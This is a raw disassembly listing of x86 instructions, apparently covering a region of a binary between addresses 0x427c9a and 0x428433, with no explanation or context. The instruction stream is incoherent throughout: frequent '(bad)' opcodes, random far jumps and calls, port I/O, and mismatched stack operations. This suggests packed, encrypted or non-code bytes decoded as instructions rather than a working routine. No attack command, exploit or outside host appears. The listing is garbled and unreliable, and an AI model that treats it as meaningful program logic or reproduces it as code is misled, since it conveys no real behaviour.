  427c9a:	outs   dx,BYTE PTR ds:[esi]
  427c9b:	pushf  
  427c9c:	ror    edx,1
  427c9e:	fisub  DWORD PTR [edx]
  427ca0:	fst    QWORD PTR [edi]
  427ca2:	xor    DWORD PTR [ebx-0x6],0x61
  427ca6:	stos   DWORD PTR es:[edi],eax
  427ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ca8:	cmp    bh,BYTE PTR [ebx-0xdd51227]
  427cae:	dec    esp
  427caf:	ret    0xc092
  427cb2:	mov    esp,0x42ed8cd4
  427cb7:	jae    0x427d0a
  427cb9:	ret    0x2103
  427cbc:	test   BYTE PTR [ebp+ebx*8+0x3e],al
  427cc0:	add    ebp,edi
  427cc2:	loope  0x427cc3
  427cc4:	jl     0x427cde
  427cc6:	fsub   DWORD PTR [eax-0x2b]
  427cc9:	add    al,0x6e
  427ccb:	pop    ebx
  427ccc:	pop    ds
  427ccd:	ret    0xef8c
  427cd0:	repz into 
  427cd2:	inc    edi
  427cd3:	xchg   ebx,eax
  427cd4:	cld    
  427cd5:	mov    eax,0xe93dd3ef
  427cda:	(bad)  
  427cdc:	mov    ds:0x665d46e2,eax
  427ce1:	jne    0x427cce
  427ce3:	pop    ss
  427ce4:	(bad)  
  427ce5:	fld    DWORD PTR [ebx+0x74866331]
  427ceb:	mov    ch,0xf7
  427ced:	add    BYTE PTR [eax+eax*1+0x0],dh
  427cf4:	add    BYTE PTR [eax],al
  427cf6:	add    BYTE PTR [eax],al
  427cf8:	add    BYTE PTR [eax],al
  427cfa:	sbb    esp,DWORD PTR [edi]
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	mov    bh,0x6d
  427d08:	xor    ch,al
  427d0a:	pusha  
  427d0b:	repnz add DWORD PTR [eax],eax
  427d0e:	std    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [edx-0x529a0230],al
  427d17:	dec    ebx
  427d18:	jge    0x427cf5
  427d1a:	dec    edi
  427d1c:	sub    eax,0xe67ded1
  427d21:	in     al,dx
  427d22:	jno    0x427d22
  427d24:	ret    0xfeeb
  427d27:	ror    BYTE PTR [edx],0xb3
  427d2a:	(bad)  [edx+0x2f]
  427d2d:	lods   al,BYTE PTR ds:[esi]
  427d2e:	and    eax,0x1d57e5c0
  427d33:	inc    esi
  427d34:	rol    BYTE PTR [ebx],1
  427d36:	ror    DWORD PTR [esi-0x59674b10],1
  427d3c:	jmp    0x427d77
  427d3e:	out    0xc5,al
  427d40:	ror    BYTE PTR [edx],0x4e
  427d43:	enter  0xb758,0x18
  427d47:	add    dh,BYTE PTR [esp+ecx*8+0x2742f610]
  427d4e:	xchg   ecx,eax
  427d4f:	and    al,BYTE PTR ds:0xda928989
  427d55:	in     eax,0x3c
  427d57:	dec    ebp
  427d58:	or     dl,BYTE PTR [ecx-0x8]
  427d5b:	push   edx
  427d5c:	inc    ecx
  427d5d:	daa    
  427d5e:	jo     0x427dd6
  427d60:	stos   BYTE PTR es:[edi],al
  427d61:	outs   dx,BYTE PTR ds:[esi]
  427d62:	retf   0x5855
  427d65:	dec    esp
  427d66:	xor    DWORD PTR [edx],ebx
  427d68:	pop    edx
  427d69:	rcl    DWORD PTR [ecx+0x770155b1],cl
  427d6f:	jbe    0x427db6
  427d71:	rol    BYTE PTR [ebx+eax*1+0x37525445],cl
  427d78:	inc    esi
  427d79:	daa    
  427d7a:	xchg   ecx,eax
  427d7b:	lods   al,BYTE PTR ds:[esi]
  427d7c:	mov    ebx,DWORD PTR [esi-0x19b8c22b]
  427d82:	pop    ecx
  427d83:	sub    al,0x82
  427d85:	fdivr  DWORD PTR [edx]
  427d87:	stos   DWORD PTR es:[edi],eax
  427d88:	std    
  427d89:	sbb    al,al
  427d8b:	add    al,0xb
  427d8d:	push   ebp
  427d8e:	xor    DWORD PTR [ebp+edi*1+0x7c922940],0xb7489823
  427d99:	adc    al,0xbf
  427d9b:	xor    edx,DWORD PTR [esi]
  427d9d:	add    al,0x35
  427d9f:	sbb    edi,edi
  427da1:	fwait
  427da2:	es loopne 0x427d7b
  427da5:	jne    0x427e1a
  427da7:	jbe    0x427e1c
  427da9:	mov    WORD PTR [ebp+0x3a],ss
  427dac:	adc    al,0xde
  427dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427daf:	push   ss
  427db0:	lods   al,BYTE PTR ds:[esi]
  427db1:	mov    bl,BYTE PTR [edx-0x11dd00c1]
  427db7:	xchg   esi,eax
  427db8:	(bad)  
  427db9:	lds    ecx,FWORD PTR [edi]
  427dbb:	adc    BYTE PTR [eax-0x19],dl
  427dbe:	ffreep st(4)
  427dc0:	sub    BYTE PTR es:[esi],0xba
  427dc4:	pop    es
  427dc5:	fidiv  WORD PTR [ebx]
  427dc7:	mov    ch,0xb
  427dc9:	mov    WORD PTR [ecx-0x6c197cb],?
  427dcf:	imul   ecx,DWORD PTR [si],0x3229c606
  427dd6:	mov    cl,BYTE PTR [esp+edx*4]
  427dd9:	inc    ebp
  427dda:	cmp    eax,0x6dde6b9f
  427ddf:	jmp    DWORD PTR [eax]
  427de1:	(bad)  
  427de2:	stc    
  427de3:	xor    eax,0x6802be94
  427de8:	lods   al,BYTE PTR ds:[esi]
  427de9:	in     eax,0x38
  427deb:	(bad)  
  427dec:	lahf   
  427ded:	adc    eax,0x21914f46
  427df2:	jmp    0x8ce3:0x7a917ab7
  427df9:	push   ds
  427dfa:	pop    ds
  427dfb:	arpl   WORD PTR [eax],sp
  427dfd:	loope  0x427e17
  427dff:	frstor [ebp+0x647ce6cb]
  427e05:	test   DWORD PTR [ebx],0x479951eb
  427e0b:	mov    BYTE PTR [eax+0x7ed3c04c],dl
  427e11:	pop    esp
  427e12:	mov    cl,0x97
  427e14:	imul   esi,edi,0x7e
  427e17:	(bad)  
  427e18:	aam    0x81
  427e1a:	jo     0x427e53
  427e1c:	jl     0x427e06
  427e1e:	rol    BYTE PTR [edx+esi*1],cl
  427e21:	(bad)  
  427e22:	add    DWORD PTR [edi-0x6],esp
  427e25:	sbb    esi,0x1442f5cb
  427e2b:	mov    al,0xe5
  427e2d:	pop    ebp
  427e2e:	(bad)  
  427e2f:	sub    eax,0xff3eecf6
  427e34:	pop    ecx
  427e35:	mov    ah,0x1b
  427e37:	fwait
  427e38:	test   eax,0x62c62c09
  427e3d:	jne    0x427e2d
  427e3f:	mov    ebx,0x8bb3bc1d
  427e44:	aas    
  427e45:	push   0x18
  427e47:	jmp    0x9b524183
  427e4c:	adc    ah,BYTE PTR [ebx-0x5e0c9f6e]
  427e52:	(bad)  
  427e53:	out    dx,al
  427e54:	test   BYTE PTR [ebp-0x5bd93b9d],0x77
  427e5b:	idiv   BYTE PTR [ecx*2-0x58a10d86]
  427e62:	(bad)  
  427e63:	mov    ecx,0x41a4168d
  427e68:	xchg   esp,eax
  427e69:	lods   al,BYTE PTR ds:[esi]
  427e6a:	(bad)  
  427e6b:	sub    esp,DWORD PTR [esi]
  427e6d:	in     al,dx
  427e6e:	xor    DWORD PTR [ebp-0x60],edx
  427e71:	jmp    0x427eef
  427e73:	fidiv  WORD PTR [eax+0x3d]
  427e76:	push   0xffffffba
  427e78:	mov    al,0x7c
  427e7a:	scas   eax,DWORD PTR es:[edi]
  427e7b:	sub    dl,0xfb
  427e7e:	push   esp
  427e7f:	mov    dh,0xfd
  427e81:	ret    
  427e82:	sbb    eax,0xd51c42ac
  427e87:	sub    eax,0xebc9b53a
  427e8c:	mov    edx,DWORD PTR [eax+0x1fe8b31a]
  427e92:	fs mov ah,0xe3
  427e95:	xlat   BYTE PTR ds:[ebx]
  427e96:	xchg   ebp,eax
  427e97:	or     ah,BYTE PTR [bp+di+0x4b]
  427e9b:	xchg   ecx,eax
  427e9c:	nop
  427e9d:	outs   dx,BYTE PTR ds:[esi]
  427e9e:	xor    ebx,ecx
  427ea0:	pop    es
  427ea1:	inc    esi
  427ea2:	retf   0x89bb
  427ea5:	les    esi,FWORD PTR ss:[esi+0x51]
  427ea9:	clc    
  427eaa:	pop    ebx
  427eab:	ret    
  427eac:	lock cmp al,0xba
  427eaf:	imul   eax,DWORD PTR [edi+0x4ead5b51],0xffffffc1
  427eb6:	in     eax,dx
  427eb7:	xor    eax,0x30914dbc
  427ebc:	push   ss
  427ebd:	mov    edi,cs
  427ebf:	stos   BYTE PTR es:[edi],al
  427ec0:	inc    esp
  427ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ec2:	cmp    BYTE PTR [ecx-0x71979162],ch
  427ec8:	test   eax,0x19a73ed3
  427ecd:	aaa    
  427ece:	scas   eax,DWORD PTR es:[edi]
  427ecf:	and    eax,0x62bcff91
  427ed4:	xor    BYTE PTR [ecx],al
  427ed6:	(bad)  [eax-0xe534f26]
  427edc:	hlt    
  427edd:	jno    0x427f32
  427edf:	pop    es
  427ee0:	push   ds
  427ee1:	(bad)  
  427ee3:	mov    ds:0x1b7bd127,al
  427ee8:	adc    esp,DWORD PTR [esi]
  427eea:	jp     0x427e72
  427eec:	retf   0xdf1a
  427eef:	pop    edi
  427ef0:	mov    esp,0x455221e7
  427ef5:	fdivrp st(7),st
  427ef7:	jmp    0x688d:0xedcc019f
  427efe:	out    dx,eax
  427eff:	mov    dh,0x50
  427f01:	(bad)  
  427f03:	mov    WORD PTR [edi+eiz*8-0x34],ss
  427f07:	xchg   BYTE PTR [esi-0x55a25ec6],ah
  427f0d:	or     al,0x5f
	...
  427f17:	add    BYTE PTR [eax],al
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0x74]
  427f27:	fcom   DWORD PTR ds:0x1f45def
  427f2d:	add    ch,bh
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [ebx-0x2a517862],al
  427f37:	and    al,0x6e
  427f39:	pusha  
  427f3a:	inc    eax
  427f3b:	pop    edi
  427f3c:	ficom  DWORD PTR [edx-0x1f]
  427f3f:	pop    edi
  427f40:	into   
  427f41:	and    bh,0x6
  427f44:	or     al,0x8f
  427f46:	pop    edx
  427f47:	(bad)  
  427f49:	sbb    eax,0x2560806
  427f4e:	lods   al,BYTE PTR ds:[esi]
  427f4f:	mov    ecx,edi
  427f51:	jecxz  0x427f97
  427f53:	mov    BYTE PTR [esi-0x77],al
  427f56:	int3   
  427f57:	psrad  mm0,mm2
  427f5a:	dec    ecx
  427f5b:	xlat   BYTE PTR ds:[ebx]
  427f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f5d:	daa    
  427f5e:	mov    cl,0x67
  427f60:	lea    edx,[edx]
  427f62:	dec    edi
  427f63:	das    
  427f64:	scas   al,BYTE PTR es:[edi]
  427f65:	and    DWORD PTR [esp+edi*2],esi
  427f68:	rcr    BYTE PTR [edi+0x5608a4dc],0xb4
  427f6f:	sub    eax,0x4a985210
  427f74:	int    0xa7
  427f76:	int    0x7b
  427f78:	imul   ebp,DWORD PTR [ebp+0x4aaab128],0x6cdc47c5
  427f82:	mov    dh,0xd6
  427f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f85:	push   esp
  427f86:	inc    esp
  427f87:	sbb    ebx,ecx
  427f89:	sbb    al,BYTE PTR [esi+0x29]
  427f8c:	jnp    0x427fcf
  427f8e:	cmp    edi,DWORD PTR [edx-0x2e355a7a]
  427f94:	aaa    
  427f95:	pop    ebp
  427f96:	mov    BYTE PTR [edx],ch
  427f98:	adc    eax,0xd509380f
  427f9d:	call   0xa07d50fe
  427fa2:	(bad)  
  427fa3:	test   DWORD PTR [edx],0xf5ab7884
  427fa9:	fnstcw WORD PTR [ebp-0x6584c5fd]
  427faf:	jmp    0x9627:0x2d25ff88
  427fb6:	(bad)  
  427fb7:	mov    al,ds:0xa381526a
  427fbc:	dec    ecx
  427fbd:	inc    ecx
  427fbe:	imul   esi,DWORD PTR [edx+0x59],0x14
  427fc2:	scas   al,BYTE PTR es:[edi]
  427fc3:	sbb    al,BYTE PTR [edi-0x2a0e1ac]
  427fc9:	call   0x9edcd009
  427fce:	dec    BYTE PTR [ebp+edi*8+0x2c]
  427fd2:	in     al,dx
  427fd3:	(bad)  
  427fd4:	jnp    0x427f99
  427fd6:	stos   BYTE PTR es:[edi],al
  427fd7:	or     cl,0x9e
  427fda:	mov    ch,0x62
  427fdc:	outs   dx,DWORD PTR ds:[esi]
  427fdd:	je     0x428016
  427fdf:	dec    edx
  427fe0:	cdq    
  427fe1:	fmul   QWORD PTR [ebp+0x3]
  427fe4:	ret    0xce7
  427fe7:	scas   al,BYTE PTR es:[edi]
  427fe8:	pop    ebx
  427fe9:	aas    
  427fea:	aam    0xe0
  427fec:	inc    edx
  427fed:	and    DWORD PTR [edx+0x7b196df7],esi
  427ff3:	jle    0x427f7e
  427ff5:	push   ebx
  427ff6:	call   0x25ab:0xe56bd906
  427ffd:	les    esi,FWORD PTR [ebx-0x8]
  428000:	dec    ecx
  428001:	and    bl,BYTE PTR [esi+0x35]
  428004:	or     cl,ch
  428006:	mov    edi,0x8cc412ca
  42800b:	repnz add BYTE PTR [esi],bh
  42800e:	fs xchg ecx,eax
  428010:	imul   ebx,DWORD PTR [ebx-0x4f],0xdd05ca9f
  428017:	jle    0x42804c
  428019:	xchg   esi,eax
  42801a:	pop    eax
  42801b:	aam    0x2a
  42801d:	neg    BYTE PTR [eax+esi*1-0x25b5e3da]
  428024:	idiv   DWORD PTR [edx+edx*1-0x46fd3764]
  42802b:	sahf   
  42802c:	test   al,0x85
  42802e:	push   ecx
  42802f:	mov    edi,0x1dead37c
  428034:	repz add BYTE PTR [ebx+0x44],dh
  428038:	popa   
  428039:	scas   eax,DWORD PTR es:[edi]
  42803a:	or     al,0x2b
  42803c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42803e:	cwde   
  42803f:	es jns 0x428064
  428042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428043:	mov    dl,0xc5
  428045:	call   0x3c90a2b7
  42804a:	imul   edx,DWORD PTR [eax],0x75
  42804d:	sub    dl,BYTE PTR [edi-0x3c]
  428050:	fadd   st,st(6)
  428052:	repz push ebp
  428054:	js     0x42805f
  428056:	mov    BYTE PTR [ebp+edi*4-0x7b],al
  42805a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42805b:	pop    es
  42805c:	loopne 0x4280c7
  42805e:	pop    esi
  42805f:	push   ebp
  428060:	sub    dl,BYTE PTR [esi-0x28]
  428063:	mov    bl,0x37
  428065:	add    eax,0x51a424cb
  42806a:	pop    ds
  42806b:	mov    esp,?
  42806d:	sti    
  42806e:	repz inc esp
  428070:	pop    edi
  428071:	cmp    ebx,DWORD PTR [edx]
  428073:	mov    al,ds:0x42f567a3
  428078:	and    esi,DWORD PTR [ebx]
  42807a:	scas   al,BYTE PTR es:[edi]
  42807b:	repz jmp 0x4280cf
  42807e:	in     eax,0xf5
  428080:	pop    edi
  428081:	into   
  428082:	mov    WORD PTR [esi+0xe8c36d8],cs
  428088:	inc    ecx
  428089:	push   ecx
  42808a:	and    DWORD PTR [esi-0x7e184a06],ebx
  428090:	fmul   DWORD PTR [ebp+0x4c999493]
  428096:	xor    al,0xf3
  428098:	add    BYTE PTR [edi+0x62],0xa7
  42809c:	sub    esp,eax
  42809e:	push   esi
  42809f:	pusha  
  4280a0:	arpl   WORD PTR [edi+ecx*1],bx
  4280a3:	xchg   ebp,eax
  4280a4:	sahf   
  4280a5:	cmovno edx,esp
  4280a8:	add    edi,DWORD PTR [edx]
  4280aa:	mov    ebp,0xc96cb9d7
  4280af:	and    BYTE PTR [esi],bh
  4280b1:	ja     0x4280ef
  4280b3:	enter  0xa3ab,0x49
  4280b7:	lea    edi,[ebx]
  4280b9:	mov    esi,0x9ec8dac4
  4280be:	and    eax,0x4899cc18
  4280c3:	mov    ebp,0x36a0f146
  4280c8:	jecxz  0x4280b4
  4280ca:	cwde   
  4280cb:	mov    bl,0x8
  4280cd:	into   
  4280ce:	out    0x4a,eax
  4280d0:	jp     0x4280ed
  4280d2:	dec    ecx
  4280d3:	mov    ds:0xf88cc97b,eax
  4280d8:	mov    ebx,0x7d538dad
  4280dd:	lods   al,BYTE PTR ds:[esi]
  4280de:	xchg   ecx,eax
  4280df:	enter  0x3bb,0x4a
  4280e3:	xor    BYTE PTR [edx-0x7],cl
  4280e6:	gs jge 0x428091
  4280e9:	clc    
  4280ea:	int    0x43
  4280ec:	pop    ss
  4280ed:	sub    DWORD PTR [eax-0x38],ebp
  4280f0:	and    DWORD PTR fs:[ebp-0x57],esp
  4280f4:	stc    
  4280f5:	fcomip st,st(4)
  4280f7:	lods   al,BYTE PTR ds:[esi]
  4280f8:	jae    0x4280c5
  4280fa:	repnz xor eax,0x53925d31
  428100:	mov    dl,0xb5
  428102:	lods   eax,DWORD PTR ds:[esi]
  428103:	stc    
  428104:	(bad)  
  428105:	retf   0x7bf1
  428108:	call   0x7e37:0xa82a2a5d
  42810f:	dec    edx
  428110:	mov    esp,0x593a057e
  428115:	inc    edx
  428116:	je     0x4280dd
  428118:	aad    0x63
  42811a:	test   eax,0xa0add9ef
  42811f:	sub    DWORD PTR [ebx+0x49],ebx
  428122:	jns    0x428145
  428124:	xlat   BYTE PTR ds:[ebx]
  428125:	loop   0x4280e5
  428127:	mov    eax,ds:0xde502edb
  42812c:	mov    DWORD PTR ds:0x5c,0x0
  428136:	add    BYTE PTR [eax],al
  428138:	add    BYTE PTR [eax],al
  42813a:	nop
  42813b:	stos   DWORD PTR es:[edi],eax
  42813c:	es ret 
  42813e:	aas    
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	rol    DWORD PTR [ebx-0x7e],0xa5
  42814a:	pop    edx
  42814b:	test   BYTE PTR [ecx],0x0
  42814e:	std    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [edi+0x6d],ch
  428154:	sti    
  428155:	xchg   esp,eax
  428156:	ret    
  428157:	push   esi
  428158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428159:	mov    es:0x348dce02,al
  42815f:	inc    esi
  428160:	leave  
  428161:	nop
  428162:	test   al,0xe1
  428164:	aad    0xb7
  428166:	pop    ebp
  428167:	xchg   edx,esi
  428169:	dec    edi
  42816a:	into   
  42816b:	xchg   edx,eax
  42816c:	mov    esp,0x5a1a0b17
  428171:	fucomip st,st(7)
  428173:	push   0xcc9ad827
  428178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428179:	pop    edi
  42817a:	repnz ins BYTE PTR es:[edi],dx
  42817c:	cmp    BYTE PTR [ebp+ebp*4+0x511a998e],bh
  428183:	outs   dx,DWORD PTR ds:[esi]
  428184:	mov    dh,0x5a
  428186:	push   edx
  428187:	arpl   WORD PTR [ebp-0x3e],dx
  42818a:	sbb    dh,BYTE PTR [eax]
  42818c:	jmp    0x879c:0xafb3cc81
  428193:	hlt    
  428194:	fnstcw WORD PTR [ecx+eiz*4]
  428197:	dec    edx
  428198:	jb     0x428188
  42819a:	daa    
  42819b:	dec    esi
  42819c:	cdq    
  42819d:	cmp    al,0x82
  42819f:	scas   al,BYTE PTR es:[edi]
  4281a0:	mov    dh,0xcd
  4281a2:	gs jbe 0x428185
  4281a5:	icebp  
  4281a6:	cmp    DWORD PTR [esi+0x2873283],ecx
  4281ac:	lods   al,BYTE PTR ds:[esi]
  4281ad:	lahf   
  4281ae:	xor    BYTE PTR [edi],al
  4281b0:	jl     0x4281ac
  4281b2:	jns    0x42815d
  4281b4:	pop    es
  4281b5:	ss fcmovnu st,st(3)
  4281b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281b9:	cld    
  4281ba:	aaa    
  4281bb:	pop    ss
  4281bc:	add    dh,al
  4281be:	arpl   WORD PTR [esi-0x34926d4a],ax
  4281c4:	scas   al,BYTE PTR es:[edi]
  4281c5:	dec    BYTE PTR [esi]
  4281c7:	fmul   QWORD PTR [eax+0x29]
  4281ca:	loop   0x42818d
  4281cc:	cwde   
  4281cd:	adc    ch,al
  4281cf:	outs   dx,BYTE PTR ds:[esi]
  4281d0:	fld    DWORD PTR [ebx+0x10372787]
  4281d6:	push   eax
  4281d7:	sub    BYTE PTR [ebx+0x7e],al
  4281da:	(bad)  
  4281db:	jecxz  0x4281f4
  4281dd:	enter  0x3aca,0xc9
  4281e1:	jg     0x42818c
  4281e3:	and    ah,BYTE PTR [edi+0x322963ef]
  4281e9:	cld    
  4281ea:	dec    BYTE PTR [ebx+ecx*8]
  4281ed:	xchg   ecx,eax
  4281ee:	push   esi
  4281ef:	mov    eax,0xf62a8a19
  4281f4:	xchg   esi,eax
  4281f5:	in     eax,0x5c
  4281f7:	in     al,dx
  4281f8:	sub    DWORD PTR [ebx],eax
  4281fa:	sub    al,0x2c
  4281fc:	repz cmp ch,bh
  4281ff:	inc    edi
  428200:	lahf   
  428201:	mov    esp,0xb6095dc3
  428206:	sub    eax,0x2b664c5d
  42820b:	lds    eax,FWORD PTR [ebx+edx*4-0xd]
  42820f:	inc    esp
  428210:	sbb    eax,0xe2ffc699
  428215:	pop    edi
  428216:	adc    BYTE PTR [edi-0x15],bh
  428219:	lahf   
  42821a:	push   ss
  42821b:	es and al,0x95
  42821e:	int3   
  42821f:	mov    dl,0x3c
  428221:	mov    DWORD PTR [edx+0x296320b7],eax
  428227:	(bad)  
  428229:	mov    ah,0xb6
  42822b:	ret    
  42822c:	popf   
  42822d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42822e:	jb     0x428269
  428230:	pop    esi
  428231:	sbb    DWORD PTR [edx+edi*8+0x37],0x4d
  428236:	std    
  428237:	cmp    dh,BYTE PTR [ebx]
  428239:	and    ebx,DWORD PTR [edx]
  42823b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42823c:	xchg   ecx,eax
  42823d:	mov    esi,ecx
  42823f:	xor    BYTE PTR [edx+0x30],dh
  428242:	fnstcw WORD PTR gs:[edi+0x38]
  428246:	popf   
  428247:	dec    esp
  428248:	fistp  QWORD PTR [edi+edi*8+0x4e753e7b]
  42824f:	inc    ebx
  428250:	rol    cl,cl
  428252:	dec    esp
  428253:	nop
  428254:	fdiv   QWORD PTR [esi+0x6c]
  428257:	pop    ecx
  428258:	sub    DWORD PTR [ebx],esp
  42825a:	gs mov dh,0x89
  42825d:	pop    ecx
  42825e:	jb     0x4282bb
  428260:	imul   BYTE PTR [ecx]
  428262:	jle    0x42823e
  428264:	dec    ebp
  428265:	xchg   ebp,eax
  428266:	pop    edx
  428267:	shr    DWORD PTR [ecx+0x2c],1
  42826a:	sbb    eax,0x17d9e96b
  42826f:	xlat   BYTE PTR ds:[ebx]
  428270:	add    eax,0x45d9f444
  428275:	bound  esi,QWORD PTR [eax]
  428277:	test   eax,0xba586193
  42827c:	stos   DWORD PTR es:[edi],eax
  42827d:	lods   eax,DWORD PTR ds:[esi]
  42827e:	fidiv  DWORD PTR [esi-0x3b]
  428281:	adc    eax,0xd52caef6
  428286:	bound  edx,QWORD PTR [ebx-0x30]
  428289:	mov    cl,0x23
  42828b:	pushf  
  42828c:	mov    bl,0x5b
  42828e:	in     eax,0xbe
  428290:	ds call 0xd47d1362
  428296:	test   eax,0x47ff5619
  42829b:	mov    esp,0x87cf0ca
  4282a0:	shl    BYTE PTR [ecx],cl
  4282a2:	add    al,0x51
  4282a4:	shl    DWORD PTR [ecx],1
  4282a6:	xor    ch,BYTE PTR [edx+0x4d4daf9a]
  4282ac:	ffree  st(7)
  4282ae:	jl     0x428277
  4282b0:	sar    ebx,cl
  4282b2:	lods   al,BYTE PTR ds:[esi]
  4282b3:	ret    0xc762
  4282b6:	rol    al,1
  4282b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282b9:	cmp    al,0xc8
  4282bb:	cmc    
  4282bc:	addr16 hlt 
  4282be:	cs scas eax,DWORD PTR es:[edi]
  4282c0:	rol    BYTE PTR [ecx-0x6a],1
  4282c3:	out    dx,eax
  4282c4:	lods   eax,DWORD PTR ss:[esi]
  4282c6:	in     eax,dx
  4282c7:	cs cs xchg ebx,eax
  4282ca:	lea    esp,[esi-0x2]
  4282cd:	fsubr  DWORD PTR [eax]
  4282cf:	dec    edi
  4282d0:	inc    dl
  4282d2:	push   0x950ef0f0
  4282d7:	stos   BYTE PTR es:[edi],al
  4282d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282d9:	call   0xef38:0xb94daed7
  4282e0:	mov    ecx,0x8ef3d14f
  4282e5:	mov    al,ds:0x6e5425ad
  4282ea:	fimul  WORD PTR [ebp+0x348c507a]
  4282f0:	repnz frstor [esi+ebp*8+0x7953bb82]
  4282f8:	sub    DWORD PTR [ebx+eiz*1-0x39],edi
  4282fc:	test   BYTE PTR [esi],ch
  4282fe:	or     al,0x84
  428300:	add    al,0x9e
  428302:	in     eax,0x74
  428304:	and    dh,bl
  428306:	jns    0x4282e1
  428308:	mov    bl,0x37
  42830a:	push   0x4b
  42830c:	outs   dx,BYTE PTR ds:[esi]
  42830d:	jne    0x4282a5
  42830f:	jmp    0xb7038c22
  428314:	out    dx,eax
  428315:	and    DWORD PTR [ebp+0x11],edx
  428318:	cmp    eax,0xdd52699a
  42831d:	leave  
  42831e:	mov    al,BYTE PTR [ebx-0x2c]
  428321:	mov    esp,es
  428323:	push   edi
  428324:	and    ebp,edx
  428326:	jb     0x4282ed
  428328:	cmp    al,0x8e
  42832a:	xchg   DWORD PTR [eax*4-0x584c7432],ebp
  428331:	icebp  
  428332:	inc    esp
  428333:	popf   
  428334:	outs   dx,DWORD PTR ds:[esi]
  428335:	fsubr  DWORD PTR [ebx+0x56]
  428338:	lea    edi,[edi]
  42833a:	pop    eax
  42833b:	push   ds
  42833c:	xchg   BYTE PTR [edx],cl
  42833e:	pop    ss
  42833f:	xor    eax,0xfb7fa9a9
  428344:	xchg   edi,eax
  428345:	std    
  428346:	ss retf 
  428348:	adc    esp,DWORD PTR [ebx-0x729b4d39]
  42834e:	or     al,0x0
	...
  428358:	add    BYTE PTR [eax],al
  42835a:	std    
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x428394
  428367:	pushf  
  428368:	dec    edx
  428369:	loopne 0x4283c2
  42836b:	clc    
  42836c:	add    DWORD PTR [eax],eax
  42836e:	out    dx,eax
  42836f:	add    DWORD PTR [eax],eax
  428371:	add    BYTE PTR [ebx+0x1f42aadf],bh
  428377:	pop    es
  428378:	mov    dh,0xfe
  42837a:	fimul  DWORD PTR [eax+edi*1-0x792b5f00]
  428381:	and    DWORD PTR [ebp+ebp*2+0x44],eax
  428385:	mov    ah,0x29
  428387:	adc    eax,DWORD PTR [eax]
  428389:	ds pop ss
  42838b:	std    
  42838c:	sbb    DWORD PTR [ecx+0x188a759d],ebp
  428392:	inc    eax
  428393:	pop    esi
  428394:	jno    0x428408
  428396:	sar    esp,0x3f
  428399:	jb     0x428350
  42839b:	test   DWORD PTR [esi+0x6fa0b9d9],ecx
  4283a1:	in     al,dx
  4283a2:	loop   0x428339
  4283a4:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283a6:	inc    esp
  4283a7:	out    0x6a,eax
  4283a9:	outs   dx,BYTE PTR ds:[esi]
  4283aa:	sub    DWORD PTR [edi+edi*1-0x51aa1423],esp
  4283b1:	fnstenv [ecx]
  4283b3:	sub    al,0xe2
  4283b5:	mov    esp,DWORD PTR [ebp-0x6ab4ec77]
  4283bb:	daa    
  4283bc:	adc    DWORD PTR [ecx+0x4f3e709c],esi
  4283c2:	sub    al,0x66
  4283c4:	mov    dl,0xbc
  4283c6:	hlt    
  4283c7:	mov    WORD PTR [edx-0x2168f4c6],cs
  4283cd:	jl     0x4283fd
  4283cf:	mov    al,0xc5
  4283d1:	add    al,0x1e
  4283d3:	and    ebx,DWORD PTR [esi-0x2b]
  4283d6:	sbb    edi,0x27759ad1
  4283dc:	dec    ebp
  4283dd:	mov    ch,0x96
  4283df:	push   ebp
  4283e0:	cwde   
  4283e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283e2:	pop    ecx
  4283e3:	push   eax
  4283e4:	lds    esp,FWORD PTR [edx+0x724fc5d1]
  4283ea:	and    ah,BYTE PTR [esi-0x6]
  4283ed:	fiadd  WORD PTR [edi-0xb345e70]
  4283f3:	or     eax,0xbf57084e
  4283f8:	sbb    edx,DWORD PTR [esp+0x6b]
  4283fc:	xchg   esp,eax
  4283fd:	ficom  WORD PTR [eax+ebx*1-0x46]
  428401:	cmp    BYTE PTR [edx+0x13],dh
  428404:	mov    ah,BYTE PTR [edi+0x10]
  428407:	xor    bh,BYTE PTR [esi+0x5e73152c]
  42840d:	push   ebx
  42840e:	or     DWORD PTR ds:0xab8edc69,esi
  428414:	jl     0x428490
  428416:	xchg   ebx,eax
  428417:	jecxz  0x4283a4
  428419:	(bad)  
  42841a:	dec    ebx
  42841b:	inc    ecx
  42841c:	mov    al,0x9
  42841e:	mov    eax,esi
  428420:	inc    ebx
  428421:	mov    BYTE PTR [edi],al
  428423:	aas    
  428424:	dec    esi
  428425:	mov    ecx,0x883172f
  42842a:	pop    eax
  42842b:	arpl   WORD PTR [edx+0x70],cx
  42842e:	leave  
  42842f:	sahf   
  428430:	addr16 loope 0x4283c8
  428433:	shr    ebx,0x2e
